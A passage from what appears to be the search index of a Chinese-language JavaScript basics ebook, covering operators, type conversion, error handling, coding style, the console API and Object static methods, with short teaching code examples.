\u7b97\u672f\u8fd0\u7b97\u7b26","text":""},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/#_2","title":"\u52a0\u6cd5","text":"<p>\u52a0\u6cd5\u8fd0\u7b97\u7b26\u5b58\u5728\u91cd\u8f7d\uff0c\u53ef\u80fd\u51fa\u73b0\u6570\u636e\u7c7b\u578b\u7684\u8f6c\u5316\uff0c\u6240\u4ee5\u4f7f\u7528\u5b57\u7b26\u4e32\u548c\u6570\u503c\u9700\u8981\u5c0f\u5fc3\u3002\u5bf9\u8c61\u76f8\u52a0\uff0c\u9996\u5148\u8fd4\u56de\u5bf9\u8c61\u81ea\u8eab[Object Object], \u7136\u540e\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\u76f8\u52a0\u3002</p>"},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/#_3","title":"\u4f59\u6570","text":"<p>\u4f59\u6570\u8fd0\u7b97\uff1a\u8fd0\u7b97\u7ed3\u679c\u7684\u7b26\u53f7\u53d6\u51b3\u4e8e\u88ab\u9664\u6570\uff0c\u5982\u679c\u88ab\u9664\u6570\u662f\u8d1f\u6570\uff0c\u90a3\u4e48\u4f59\u6570\u5c31\u662f\u8d1f\u6570(\u548c\u9664\u6570\u65e0\u5173)\u3002\u5982\u679c\u88ab\u9664\u6570\u53ef\u80fd\u662f\u8d1f\u6570\uff0c\u6700\u597d\u5148\u5bf9\u88ab\u9664\u6570\u53d6\u7edd\u5bf9\u503c\u4e4b\u540e\u8fdb\u884c\u8ba1\u7b97\u3002</p> <pre><code>function isOdd(num) {\n  return Math.abs(num) % 2 === 1;\n}\nisOdd(-5); // true\n</code></pre> <p>\u7531\u4e8eJS\u5c0f\u6570(\u6d6e\u70b9\u6570\u8ba1\u7b97\u4e0d\u51c6\u786e\uff0c\u6240\u4ee5\u4f59\u6570\u7ed3\u679c\u4e5f\u4e0d\u4e00\u5b9a\u51c6\u786e)</p>"},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/#_4","title":"\u6307\u6570","text":"<p>\u6307\u6570\u8fd0\u7b97\u7b26(**)</p> <pre><code>console.log(2 ** 10); // 1024\n</code></pre>"},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/#32","title":"3.2 \u6bd4\u8f83\u8fd0\u7b97\u7b26","text":""},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/#_5","title":"\u5927\u4e8e\u5c0f\u4e8e","text":"<p>\u5b57\u7b26\u4e32\u8fdb\u884c\u6bd4\u8f83\uff0c\u6839\u636eUnicode\u7f16\u7801\u8fdb\u884c\u6bd4\u8f83(\u901a\u5e38\u6392\u5e8f\u4f1a\u8fd9\u6837\u6bd4\u8f83)\uff1b\u6c49\u5b57\u6216\u8005\u5bf9\u8c61\u6bd4\u8f83\uff0c\u6ca1\u6709\u4efb\u4f55\u5b9e\u9645\u610f\u4e49</p> <pre><code>console.log('c' &lt; 'C'); // true\nconsole.log('\u5927' &lt; '\u5c0f'); // false\n</code></pre> <p>\u4efb\u4f55\u503c\u4e0e NaN \u6bd4\u8f83\uff0c\u8fd4\u56de\u7684\u90fd\u662ffalse</p> <p>\u5bf9\u8c61\u548c\u5bf9\u8c61\u7684\u6bd4\u8f83\uff0c\u9996\u5148\u8c03\u7528 valueOf\uff0c\u7136\u540e\u8c03\u7528 toSting \u8fdb\u884c\u6bd4\u8f83(\u901a\u5e38\u4e0d\u4f1a\u8fd9\u6837\u505a)</p> <pre><code>[2] &gt; [1] // true\n[2] &gt; [11] //true\n// \u9996\u5148\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\u540e\uff0c\u7136\u540e\u624d\u80fd\u8fdb\u884c\u6bd4\u8f83\n</code></pre>"},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/#_6","title":"\u5168\u7b49","text":"<p>\u5168\u7b49\u6bd4\u8f83(= = = )\uff0c\u5982\u679c\u662f\u590d\u6742\u6570\u636e\u7c7b\u578b\u8fdb\u884c\u6bd4\u8f83\uff0c\u90a3\u4e48\u4f1a\u6bd4\u8f83\u5185\u5b58\u5730\u5740\u3002\u4e24\u4e2a\u7a7a\u6570\u7ec4\u4e0d\u5168\u7b49\uff0c\u4e24\u4e2a\u6307\u5411\u76f8\u540c\u6570\u7ec4\u7684\u6307\u9488(\u5f15\u7528)\u662f\u5168\u7b49\u7684\u3002</p> <p>\u5bf9\u8c61\u7684\u5927\u4e8e\u5c0f\u4e8e\u6bd4\u8f83\u7684\u662f\u503c\uff0c\u5168\u7b49\u6bd4\u8f83\u7684\u662f\u5185\u5b58\u5730\u5740\u3002undefined \u548c null \u81ea\u8eab\u5168\u7b49\uff0cNaN \u81ea\u8eab\u4e0d\u5168\u7b49\u3002\u4e24\u4e2a\u672a\u8d4b\u503c\u7684\u53d8\u91cf\u90fd\u662fundefined\uff0c\u6240\u4ee5\u5168\u7b49\u3002</p>"},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/#_7","title":"\u4f4d\u8fd0\u7b97","text":"<p>\u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u7b26\uff1a\u8fd9\u4e2a\u4f7f\u7528\u7684\u4e0d\u591a\uff0c\u53ef\u80fd\u9020\u6210\u6df7\u6dc6\uff0c\u53ef\u80fd\u5728\u8ba1\u7b97\u989c\u8272 RGB \u65f6\u9700\u8981\uff0c\u8ba1\u7b97\u901f\u5ea6\u5f88\u5feb\uff0c\u64cd\u4f5c\u5e95\u5c42\u6570\u636e\uff0c\u53ea\u6574\u6570\u8d77\u4f5c\u7528\uff0c\u6d6e\u70b9\u6570\u4e0d\u80fd\u4f7f\u7528\u3002</p>"},{"location":"ebook-JS-basic/03-%E8%BF%90%E7%AE%97%E7%AC%A6/#33","title":"3.3 \u5176\u4ed6\u8fd0\u7b97\u7b26","text":"<p>void \u8fd4\u56de\u4e00\u4e2a\u7a7a\uff0c\u7528\u4e8e\u754c\u9762\u4e2da\u6807\u7b7e\u8d85\u94fe\u63a5\u963b\u6b62\u9ed8\u8ba4\u7684\u4e8b\u4ef6</p> <pre><code>&lt;a href=\"javascript: void(f())\"&gt;\u6587\u5b57&lt;/a&gt;\n</code></pre>"},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/","title":"04-\u8bed\u6cd5\u4e13\u9898","text":""},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/#_1","title":"\u7b2c\u56db\u7ae0 \u8bed\u6cd5\u4e13\u9898","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 6435  \u9605\u8bfb13\u5206\u949f</p> <p>2021-11-16 2023-04-03</p>"},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/#41","title":"4.1 \u6570\u636e\u7c7b\u578b\u8f6c\u6362","text":"<p>JS \u4e2d\u7684\u53d8\u91cf\u7684\u6570\u636e\u7c7b\u578b\u53ef\u4ee5\u81ea\u7531\u8f6c\u6362\uff0c\u5f53\u53d8\u91cf\u8fd0\u7b97\u6bd4\u8f83\u65f6\uff0c\u4f1a\u53d1\u751f\u6570\u636e\u7c7b\u578b\u7684\u8f6c\u6362\uff08\u901a\u5e38\u8f6c\u5316\u6210\u5e03\u5c14\u503c\u6216\u8005\u5b57\u7b26\u4e32\uff09\uff0c\u8fd9\u91cc\u53ef\u80fd\u51fa\u73b0\u5f88\u591a\u95ee\u9898\u3002</p> <p>\u5f3a\u5236\u6570\u636e\u7c7b\u578b\u8f6c\u5316\uff1aNumber(), String(), Boolean() \u8f6c\u6362\u7684\u89c4\u5219\u8f83\u590d\u6742\uff0c\u8f6c\u6362\u89c4\u5219\u5f88\u4e25\u683c\uff0c\u5f88\u5c11\u7528\u3002\u5982\u679c\u4f20\u5165\u7684\u5bf9\u8c61\u662f\u590d\u6742\u6570\u636e\u7c7b\u578b\uff0c\u89c4\u5219\u66f4\u590d\u6742\u3002</p> <pre><code>Number('42test') // NaN\n</code></pre> <p>\u628a\u4e00\u4e2a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u6210\u5e03\u5c14\u503c\uff0c\u4e24\u79cd\u529e\u6cd5\u90fd\u53ef\u4ee5</p> <pre><code>expression ? true : false\n!!expression\n</code></pre> <p>null \u8f6c\u5316\u6210\u6570\u503c\u662f0\uff0cundefined\u8f6c\u5316\u6210\u6570\u503c\u662f NaN\uff08\u5982\u679c\u5728\u8ba1\u7b97\u4e2d\u67d0\u4e2a\u53c2\u6570\u662f\u4e0a\u9762\u4e24\u4e2a\u503c\u53ef\u80fd\u51fa\u9519\uff09</p> <p>\u5927\u9879\u76ee\u4e2d\uff08\u591a\u4eba\uff0c\u591a\u7ec4\u4ef6\uff09\u6700\u597d\u907f\u514d\u6570\u636e\u7c7b\u578b\u7684\u5f31\u7c7b\u578b\u8f6c\u6362\uff08\u4f7f\u7528\u7c7b\u578b\u9a8c\u8bc1\u6216\u8005\u4f7f\u7528 TS\uff0c\u907f\u514d\u51fa\u9519\uff09</p>"},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/#42","title":"4.2 \u9519\u8bef\u5904\u7406\u673a\u5236","text":""},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/#error","title":"Error \u5b9e\u4f8b\u5bf9\u8c61","text":"<p>\u53ef\u4ee5\u624b\u52a8\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0cerr.message \u662f\u5176\u5c5e\u6027\u3002\u7a0b\u5e8f\u8fd0\u884c\u4e2d\u5982\u679c\u629b\u51fa Error \u5b9e\u4f8b\u5bf9\u8c61\u540e\uff0c\u6574\u4e2a\u7a0b\u5e8f\u4f1a\u4e2d\u65ad\u5728\u53d1\u751f\u9519\u8bef\u7684\u5730\u65b9\u3002</p> <pre><code>var err = new Error('code bug');\nerr.message; //\u9519\u8bef\u4fe1\u606f\nerr.name; //\u9519\u8bef\u540d\u79f0(\u975e\u6807\u51c6\u5c5e\u6027)\nerr.stack; // \u9519\u8bef\u7684\u5806\u6808(\u975e\u6807\u51c6\u5c5e\u6027)\n\nfunction throwErr() {\n  throw new Error('');\n}\n\nfunction catchErr() {\n  try {\n    throwErr();\n  } catch (error) {\n    console.log(error);\n    console.log(error.stack);\n  }\n}\n\ncatchErr();\n</code></pre> <p>error.stack \u8bf4\u660e\uff1aJS \u4ee3\u7801\u6267\u884c\u65f6\uff0c\u5982\u679c\u6709\u591a\u5c42\u51fd\u6570\u4e92\u76f8\u8c03\u7528\uff0c\u90a3\u4e48\u5c31\u5f62\u6210\u51fd\u6570\u6267\u884c\u6808\uff0c\u4f8b\u5982\u4ece\u5916\u5230\u5185\u8c03\u7528 fn1 fn2 fn3 \u51fd\u6570\uff0c\u5728 fn3 \u5185\u90e8\u62a5\u9519\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684\u6267\u884c\u6808\u5c31\u53ef\u4ee5\u8bb0\u5f55\u5230 fn1 fn2 fn3 \u51fd\u6570\uff0c\u8fd9\u6837\u4fbf\u4e8e\u6392\u67e5\u9519\u8bef\u7b49\u3002\u8fd9\u4e2a\u5c5e\u6027\u975e\u6807\u51c6\u5c5e\u6027\u3002</p> <p>\u53c2\u8003\uff1ahttps://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error%20%20/Stack</p> <p>https://www.bookstack.cn/read/node-in-debugging/3.3ErrorStack.md</p> <p>https://zhuanlan.zhihu.com/p/26637923</p>"},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/#6","title":"6\u79cd\u539f\u751f\u9519\u8bef\u7c7b\u578b","text":"<p>SyntaxError \u8bed\u6cd5\u9519\u8bef\uff1a\u62ec\u53f7\u7f3a\u5931\u3001\u53d8\u91cf\u540d\u4e0d\u6b63\u786e</p> <p>Reference \u5f15\u7528\u9519\u8bef\uff1a\u76f4\u63a5\u4f7f\u7528\u672a\u5b9a\u4e49\u7684\u53d8\u91cf\uff0c\u8d4b\u503c\u53f7\uff08=\uff09\u5de6\u4fa7\u4e0d\u80fd\u8d4b\u503c\uff0cthis\u4e0d\u80fd\u624b\u52a8\u8d4b\u503c\uff0cinvalid left-hand side in assignment</p> <p>RangeError \u8303\u56f4\u9519\u8bef\uff1a\u6570\u7ec4\u7684\u957f\u5ea6\u662f\u8d1f\u6570\uff0cNumber\u65b9\u6cd5\u7684\u53c2\u6570\u8d85\u51fa\u8303\u56f4\uff0c\u51fd\u6570\u5806\u6808\u8d85\u8fc7\u6700\u5927\u503c</p> <p>TypeError \u7c7b\u578b\u9519\u8bef\uff1a\u5bf9\u539f\u59cb\u6570\u636e\u7c7b\u578b\uff08\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u3001\u6570\u503c\uff09\u521b\u5efa\u7c7b\uff08\u6784\u9020\u51fd\u6570\uff09\u3001\u51fd\u6570\u7684\u65b9\u6cd5\u662f undefined</p> <p>URIError\uff1aURL\u9519\u8bef encode decode escape \u51fd\u6570\u4f20\u5165\u53c2\u6570\u4e0d\u6b63\u786e\uff08react-image-lightbox \u6709\u8fd9\u4e2a\u62a5\u9519\uff09</p> <p>EvalError eval \u51fd\u6570\u6ca1\u6709\u6b63\u786e\u6267\u884c\uff08\u73b0\u5728\u5df2\u7ecf\u820d\u5f03\uff0c\u8fd9\u91cc\u517c\u5bb9\u65e7\u4ee3\u7801\uff09</p> <p>\u4e0a\u9762\u76846\u4e2a\u539f\u751f\u9519\u8bef\uff0c\u548c\u7edf\u4e00\u7684Error\u7c7b\uff0c\u90fd\u53ef\u4ee5\u624b\u52a8\u751f\u6210\u9519\u8bef\u7684\u5b9e\u4f8b\uff0c\u7136\u540e\u901a\u8fc7Error.message \u8bbe\u7f6e\u9519\u8bef\u7684\u63d0\u793a\u7c7b\u578b\u3002\u7528\u6237\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2aUserError\u9519\u8bef\u5bf9\u8c61\uff0c\u8fd9\u79cd\u60c5\u51b5\u5f88\u5c11\u7528\u5230\u3002</p> <p>throw</p> <p>\u624b\u52a8\u7ec8\u6b62\u7a0b\u5e8f\u7684\u8fd0\u884c\uff0c\u53ef\u4ee5\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff08\u4e0a\u9762\u76847\u79cd\u9519\u8bef\u6216\u8005\u81ea\u5b9a\u4e49\u9519\u8bef\uff09\u6216\u8005\u4e00\u4e2a\u53d8\u91cf</p> <p>try-catch</p> <p>\u5728 try \u90e8\u5206\u8fd0\u884c\u7684\u4ee3\u7801\uff0c\u5982\u679c\u51fa\u73b0\u9519\u8bef\uff08\u629b\u51fa\u5f02\u5e38\uff09\uff0ctry\u90e8\u5206\u7684\u4ee3\u7801\u7ec8\u6b62\u8fd0\u884c\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u5165catch\u90e8\u5206\uff0c\u5904\u7406\u9519\u8bef\u60c5\u51b5\u3002\u5982\u679c\u4e0d\u786e\u5b9a\u4ee3\u7801\u662f\u5426\u51fa\u73b0\u95ee\u9898\uff0c\u5c31\u4f7f\u7528\u8fd9\u4e2a\u7ed3\u6784\uff08\u5c3d\u91cf\u51cf\u5c11\u4e0d\u786e\u5b9a\u7684\u4ee3\u7801\uff09\u3002\u5728catch\u90e8\u5206\u53ef\u4ee5\u6839\u636e\u9519\u8bef\u7684\u7c7b\u578b\u5206\u522b\u8fdb\u884c\u5904\u7406\uff08TypeError\uff0cEvalError\uff09\u5c3d\u91cf\u4e2a\u7528\u6237\u663e\u793a\u53cb\u597d\u7684\u9519\u8bef\uff0c\u4e5f\u4fbf\u4e8e\u5f00\u53d1\u8005\u8c03\u8bd5\u9519\u8bef</p> <pre><code>try {\n  foo.bar();\n} catch (e) {\n  if (e instanceof EvalError) {\n    console.log(e);\n  } else if (e instanceof RangeError) {\n    console.log(e);\n  } else {\n    console.log(e);\n  }\n} finally {\n  //  \n}\n</code></pre> <p>\u4e0d\u7ba1\u4ee3\u7801\u662f\u5426\u51fa\u9519\uff0c\u4ee3\u7801\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\uff1b\u901a\u5e38\u7528\u4e8e\u4ee3\u7801\u8fd0\u884c\u7ed3\u675f\u540e\uff0c\u6e05\u7406\u73af\u5883\u6216\u8005\u4fdd\u5b58\u4ee3\u7801</p> <pre><code>openFile();\n\ntry {\n  writeFile(Data);\n} catch(e) {\n  handleError(e);\n} finally {\n  closeFile();\n}\n</code></pre>"},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/#43","title":"4.3 \u7f16\u7a0b\u98ce\u683c","text":"<p>\u5bb9\u6613\u4ea7\u751f\u6b67\u4e49\u7684\u5730\u65b9\uff0c\u4f7f\u7528\u660e\u786e\u5199\u6cd5\u3002</p> <p>\u5706\u62ec\u53f7\u7684\u4e24\u4e2a\u7528\u6cd5\uff1a\u51fd\u6570\u8c03\u7528\u65b9\u6cd5\uff1b\u6216\u8005\u8fd0\u7b97\u4f18\u5148\u7ea7\uff08\u5c0f\u62ec\u53f7\uff09\uff0c\u51fd\u6570\u8c03\u7528\u65b9\u6cd5\u4e2d\u4e0d\u80fd\u52a0\u7a7a\u683c\uff0c\u8fd0\u7b97\u8fc7\u7a0b\u4e2d\u524d\u540e\u6700\u597d\u52a0\u4e0a\u7a7a\u683c\u3002</p> <p>\u4ee3\u7801\u884c\u672b\u5c3e\u9700\u8981\u52a0\u4e0a\u5206\u53f7\uff0c\u4e0d\u8981\u8ba9\u4ee3\u7801\u81ea\u5df1\u52a0\u5165\u5206\u53f7\uff0c\u53ef\u80fd\u51fa\u9519\u3002</p> <p>\u7531\u4e8eJS\u4e2d\u6ca1\u6709\u5757\u7ea7\u4f5c\u7528\u57df\uff0c\u5b58\u5728\u53d8\u91cf\u63d0\u5347\uff0c\u6240\u4ee5\u6700\u597d\u628a\u53d8\u91cf\u7684\u58f0\u660e\u653e\u5728\u4ee3\u7801\u524d\u9762\uff0c\u907f\u514d\u5757\u5185\u90e8\u53d8\u91cf\u63d0\u5347\u5230\u5168\u5c40\u53d8\u91cf\u3002\u5982\u679c\u9700\u8981\u52a0\u5168\u5c40\u53d8\u91cf\uff0c\u6700\u597d\u4f7f\u7528\u5927\u5199\u6216\u8005\u7279\u6b8a\u6807\u8bb0\u3002</p> <p>\u4e0d\u8981\u4f7f\u7528 with \u8bed\u53e5\uff1b\u5c3d\u91cf\u4f7f\u7528\u5168\u7b49\u4e8e\uff0c\u4e0d\u5168\u7b49\u4e8e\u4f1a\u8fdb\u884c\u6570\u636e\u7c7b\u578b\u8f6c\u6362\uff0c\u53ef\u80fd\u5b58\u5728\u95ee\u9898\uff0c\u4f1a\u5f71\u54cd\u4e00\u70b9\u6027\u80fd\u3002</p> <p>\u81ea\u589e\u548c\u81ea\u51cf\u8fd0\u7b97\u7b26\uff0c\u653e\u5728\u524d\u9762\u6216\u8005\u540e\u9762\u6548\u679c\u4e0d\u4e00\u6837\uff0c\u5982\u679c\u4f7f\u7528 += \u6216\u8005 -= \uff0c\u53ef\u8bfb\u6027\u66f4\u597d\uff08\u5982\u679c\u5728for\u5faa\u73af\u4e2d\uff0c\u4f7f\u7528 ++ -- \u8fd0\u7b97\u7b26\u66f4\u7b80\u6d01\uff09</p>"},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/#44","title":"4.4 \u63a7\u5236\u53f0\u5bf9\u8c61","text":""},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/#console-api","title":"console API","text":"<p>console \u5bf9\u8c61\u662fJS\u4e2d\u7684\u539f\u751f\u5bf9\u8c61\uff0ccommand+option+I \u5373\u53ef\u6253\u5f00\u63a7\u5236\u680f\uff0c\u7528\u4e8e\u8c03\u8bd5\u7a0b\u5e8f\u3002</p> <p>console \u5bf9\u8c61\u7684\u9759\u6001\u65b9\u6cd5</p> <pre><code>console.log('test'); // \u76f4\u63a5\u8f93\u51fa\u5b57\u7b26\u4e32\nconsole.log('%s + %s', 1,2) // \u8f93\u51fa\u5360\u4f4d\u7b26\uff0c\u7c7b\u4f3c\u4e8epython\u8f93\u51fa %s %d %i %f %c(CSS)\nconsole.log('%cThis text is styled!', 'color: red; background: yellow; font-size: 24px;');\n\nConsole.info warnings error debug \n// \u53ef\u4ee5\u5728 default levels \u4e2d\u8bbe\u7f6e\uff0c\u5982\u679c\u4ee3\u7801\u4e2d\u5f88\u591a warnings \u90a3\u4e48\u6d4f\u89c8\u5668\u4e0d\u4f1a\u663e\u793a\u8fd9\u90e8\u5206\u95ee\u9898\u3002\n\nconsole.table(); //\u53ef\u4ee5\u628a\u590d\u6742\u6570\u636e\u7c7b\u578b\u4ee5\u8868\u683c\u5f62\u5f0f\u5448\u73b0\nconsole.count(var); //\u53ef\u4ee5\u8f93\u51fa\u4ee3\u7801\u6267\u884c\u7684\u6b21\u6570\uff0c\u5982\u679c\u52a0\u5165\u53d8\u91cf\u4f1a\u5206\u7c7b\u8f93\u51fa\u4ee3\u7801\u6267\u884c\u7684\u6b21\u6570\nconsole.dir(DOM);  \nconsole.dirxml(DOM); //\u628aDOM\u8282\u70b9\u6811\u72b6\u663e\u793a\n\nconsole.assert(true, 'bug');// \u6761\u4ef6\u663e\u793a\uff1a\u5982\u679c\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u6761\u4ef6\uff0c\u90a3\u4e48\u663e\u793a\u7b2c\u4e8c\u4e2a\u53c2\u6570\n\nconsole.time();\nconsole.timeEnd(); // \u6d4b\u8bd5\u4ee3\u7801\u6267\u884c\u7684\u65f6\u95f4\nconsole.trace(); // \u663e\u793a\u5f53\u524d\u4ee3\u7801\u5728\u5806\u6808\u4e2d\u8c03\u7528\u8def\u5f84\nconsole.clear(); // \u6e05\u9664\u63a7\u5236\u53f0\u7684\u5f53\u524d\u8f93\u51fa\n</code></pre>"},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/#api","title":"\u63a7\u5236\u53f0 $ API","text":"<p>\u63a7\u5236\u53f0\u5b9a\u4e49\u4e86\u4e00\u4e2a$\u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff0c\u5982\u679c\u4f7f\u7528\u4e86jquery\uff0c\u5c31\u4f1a\u8986\u76d6\u539f\u59cb\u51fd\u6570\u7684\u529f\u80fd\u3002</p> <pre><code>$_ // \u8fd4\u56de\u4e0a\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\n$0 ~ $4 // \u8fd4\u56de\u4e4b\u524d\u9009\u4e2d\u7684DOM\u5143\u7d20\n$(selector) // === document.querySelector()\n$$(selector) // === document.querySelectorAll()\ninspect(DOM) // \u5728\u754c\u9762\u4e2d\u9009\u4e2d\u8fd9\u4e2a\u5143\u7d20\nclear(); // clear console\ncopy(dom); // copy DOM nodes into clipboard\n</code></pre>"},{"location":"ebook-JS-basic/04-%E8%AF%AD%E6%B3%95%E4%B8%93%E9%A2%98/#debugger","title":"debugger","text":"<p>\u4ee3\u7801\u8fd0\u884c\u5230\u8fd9\u91cc\u65f6\uff0c\u5982\u679c\u6d4f\u89c8\u5668\u6709\u65ad\u70b9\u529f\u80fd\uff0c\u5c31\u4f1a\u6682\u505c\u4ee3\u7801\u6267\u884c\uff08Chrome\u6d4f\u89c8\u5668\u5e38\u7528\uff09</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/","title":"05-\u6807\u51c6\u5e93","text":""},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_1","title":"\u7b2c\u4e94\u7ae0 \u6807\u51c6\u5e93","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 23101  \u9605\u8bfb47\u5206\u949f</p> <p>2021-11-17 2023-04-06</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#51-object","title":"5.1 Object \u5bf9\u8c61","text":""},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_2","title":"\u5de5\u5177\u51fd\u6570","text":"<p>Object() \u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u628a\u4f20\u5165\u7684\u503c\u8f6c\u5316\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5982\u679c\u4f20\u5165\u7684\u662fnull\u6216\u8005undefined\uff0c\u5f97\u5230\u7684\u5c31\u662f\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002\u5982\u679c\u4f20\u5165\u7684\u53c2\u6570\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u90a3\u4e48\u4ea7\u751f\u7684\u5bf9\u8c61\u662f\u5176\u5305\u88c5\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u5982\u679c\u4f20\u5165\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u90a3\u4e48\u8fd4\u56de\u7684\u8fd8\u662f\u539f\u59cb\u5bf9\u8c61\u3002\u53ef\u4ee5\u5229\u7528Object()\u8fd9\u4e2a\u51fd\u6570\u5224\u65ad\u4e00\u4e2a\u53d8\u91cf\u662f\u5426\u662f\u5bf9\u8c61\u3002</p> <pre><code>let obj = Object(1);\nobj instanceof Number // true\nobj instanceof Object // true\n</code></pre>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_3","title":"\u6784\u9020\u51fd\u6570","text":"<p>\u4f7f\u7528 new Object() \u521b\u5efa\u4e00\u4e2a\u65b0\u5bf9\u8c61\uff08\u901a\u5e38\u7528\u5bf9\u8c61\u5b57\u9762\u91cf\u521b\u5efa\u5bf9\u8c61\uff09</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_4","title":"\u9759\u6001\u65b9\u6cd5","text":"<p>\u9759\u6001\u65b9\u6cd5\u548c\u5b9e\u4f8b\u65b9\u6cd5\uff1aObject \u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\u662f\u9759\u6001\u65b9\u6cd5\uff0cObject \u539f\u578b\u94fe\u4e0a\u7684\u65b9\u6cd5\u5c31\u662f\u5b9e\u4f8b\u65b9\u6cd5\uff08Object.prototype.function\uff09\u3002\u5b9e\u4f8b\u65b9\u6cd5\u5c06\u88ab\u6240\u6709\u7684\u5b9e\u4f8b\u5bf9\u8c61\u6240\u5171\u4eab\u3002</p> <p>\u4e3b\u8981\u662f\u4e0b\u9762\u4e24\u4e2a\u9759\u6001\u65b9\u6cd5</p> <pre><code>Object.keys(obj) // \u8fd4\u56de\u5bf9\u8c61\u7684\u5c5e\u6027\uff08\u4e0d\u5305\u542b\u4e0d\u53ef\u679a\u4e3e\u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u5c5e\u6027\u6570\u7ec4\uff0c\u4e0d\u5305\u62ec\u5bf9\u8c61\u7ee7\u627f\u7684\u5c5e\u6027\uff09\n\nObject.getOwnPropertyNames(obj)  // \u8fd4\u56de\u5bf9\u8c61\u7684\u5168\u90e8\u5c5e\u6027\u6570\u7ec4\uff08\u5305\u542b\u4e0d\u53ef\u679a\u4e3e\u5c5e\u6027\uff0clength\uff09\n</code></pre> <p>\u5176\u4ed6\u9759\u6001\u65b9\u6cd5\u4e86\u89e3</p> <pre><code>\u5bf9\u8c61\u5c5e\u6027\u6a21\u578b\u7684\u76f8\u5173\u65b9\u6cd5\nObject.getOwnPropertyDescriptor()\uff1a\u83b7\u53d6\u67d0\u4e2a\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u3002\nObject.defineProperty()\uff1a\u901a\u8fc7\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5b9a\u4e49\u67d0\u4e2a\u5c5e\u6027\u3002\nObject.defineProperties()\uff1a\u901a\u8fc7\u63cf\u8ff0\u5bf9\u8c61\uff0c\u5b9a\u4e49\u591a\u4e2a\u5c5e\u6027\u3002\n\n\u63a7\u5236\u5bf9\u8c61\u72b6\u6001\u7684\u65b9\u6cd5\nObject.preventExtensions()\uff1a\u9632\u6b62\u5bf9\u8c61\u6269\u5c55\u3002\nObject.isExtensible()\uff1a\u5224\u65ad\u5bf9\u8c61\u662f\u5426\u53ef\u6269\u5c55\u3002\nObject.seal()\uff1a\u7981\u6b62\u5bf9\u8c61\u914d\u7f6e\u3002\nObject.isSealed()\uff1a\u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u53ef\u914d\u7f6e\u3002\nObject.freeze()\uff1a\u51bb\u7ed3\u4e00\u4e2a\u5bf9\u8c61\u3002\nObject.isFrozen()\uff1a\u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u88ab\u51bb\u7ed3\u3002\n\n\u539f\u578b\u94fe\u76f8\u5173\u65b9\u6cd5: \u8be5\u65b9\u6cd5\u53ef\u4ee5\u6307\u5b9a\u539f\u578b\u5bf9\u8c61\u548c\u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5bf9\u8c61\nObject.create()\n\nObject.getPrototypeOf() // 